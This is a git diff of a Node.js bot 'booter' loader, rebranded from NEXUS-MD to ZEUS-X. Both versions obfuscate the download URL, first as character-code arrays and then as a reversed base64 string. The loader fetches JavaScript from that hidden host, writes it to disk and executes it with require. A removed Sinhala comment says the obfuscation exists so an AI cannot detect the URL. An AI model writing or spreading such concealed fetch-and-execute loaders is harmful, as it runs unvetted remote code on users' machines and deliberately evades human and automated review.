@@ -1,5 +1,5 @@
 // ========================================
-// Booter System by mr thinura
+// Booter System - By Mr.Thinuzz
 // ========================================
 
 const fs = require('fs');
@@ -7,45 +7,39 @@ const path = require('path');
 const axios = require('axios');
 const { execSync } = require('child_process');
 
-// ========== ORIGINAL FEATURES ==========
-const BOT_FILE = path.join(__dirname, 'nexus.js');  
+
+const BOT_FILE = path.join(__dirname, 'zeus-x.js');  
 const UPDATE_FLAG_FILE = path.join(__dirname, '.update-flag');
 const FORCE_UPDATE_FLAG_FILE = path.join(__dirname, '.force-update-flag');
 
-// ========== FIXED: REMOVED DEMO MODE - ALWAYS RUN REAL BOT ==========
+
 function getBotUrl() {
-    const urlParts = [
-        [104, 116, 116, 112, 115, 58, 47, 47],
-        [110, 101, 120, 117, 115, 45, 102, 117, 108, 108, 45, 100, 98],
-        [46, 118, 101, 114, 99, 101, 108, 46, 97, 112, 112, 47],
-        [105, 110, 100, 101, 120, 46, 106, 115]
-    ];
-    return urlParts.map(part => part.map(c => String.fromCharCode(c)).join('')).join('');
+    const obfuscated = "c2oueGVkbmkvdmVkLnNlZ2FwLmVzYWJhdGFkLWRtLXgtc3Vlei8vOnNwdHRo";
+    const reversed = obfuscated.split('').reverse().join('');
+    return Buffer.from(reversed, 'base64').toString('utf-8');
 }
 
-//meken ai eka ape url eka detect carana eka nathi caranawa
+
 async function downloadBot() {
     const BOT_URL = getBotUrl();
-    console.log('📥 Downloading nexus.js...');
-    console.log('🔗 Fetching from source...');
-    
+    console.log('📥 Downloading zeus-xos...');    
     const response = await axios.get(BOT_URL, { 
         responseType: 'text',
         timeout: 30000,
-        headers: { 'User-Agent': 'NEXUS-MD/6.0.0' }
+        headers: { 'User-Agent': 'ZEUS-X-MD/1.0.0' }
     });
     
     fs.writeFileSync(BOT_FILE, response.data);
-    console.log('✅ nexus.js downloaded successfully!');
+    console.log('✅ zeus-xos downloaded successfully!');
     return true;
 }
 
 async function performUpdate() {
     console.log('🚀 Performing update...');
     if (fs.existsSync(BOT_FILE)) {
-        const backupFile = path.join(__dirname, 'nexus.js.backup');
+        const backupFile = path.join(__dirname, 'zeus-xos.backup');
         fs.copyFileSync(BOT_FILE, backupFile);
-        console.log('✅ Backup created: nexus.js.backup');
+        console.log('✅ Backup created: zeus-xos.backup');
     }
     await downloadBot();
     return true;
@@ -79,7 +73,7 @@ async function checkForSignals() {
     return false;
 }
 
-// ========== FIXED load error eka hadala thiyenne ==========
+// ========== FIXED load error handling ==========
 async function startBot() {
     // Download if not exists
     if (!fs.existsSync(BOT_FILE)) {
@@ -93,7 +87,7 @@ async function startBot() {
         await downloadBot();
     }
     
-    console.log('🚀 Loading NEXUS-MD bot...');
+    console.log('🚀 Loading ZEUS-X-MD...');
     
     try {
         delete require.cache[require.resolve(BOT_FILE)];
@@ -125,8 +119,8 @@ async function startBot() {
 
 async function main() {
     console.log('╔════════════════════════════════╗');
-    console.log('║     NEXUS-MD LOADER v3.1       ║');
-    console.log('║     Running in PRODUCTION mode ║');
+    console.log('║     ZEUS-X BIOS SYSTEM         ║');
+    console.log('║     Running in PRODUCTION mode ║');
     console.log('╚════════════════════════════════╝');
     
     await checkForSignals();
